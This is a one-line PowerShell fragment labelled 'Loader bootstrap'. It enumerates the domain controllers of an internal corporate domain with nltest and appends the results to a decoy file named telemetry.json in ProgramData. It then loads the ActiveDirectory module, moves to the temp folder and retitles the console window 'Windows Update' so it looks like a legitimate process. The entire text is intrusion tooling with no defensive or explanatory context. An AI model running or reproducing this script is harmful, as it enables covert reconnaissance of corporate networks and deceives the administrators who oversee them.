
<# Loader bootstrap #> nltest /dclist:internal.corp | Out-File 'C:\ProgramData\telemetry.json' -Append; Import-Module ActiveDirectory; Set-Location -Path $env:TEMP; $Host.UI.RawUI.WindowTitle = "Windows Update"
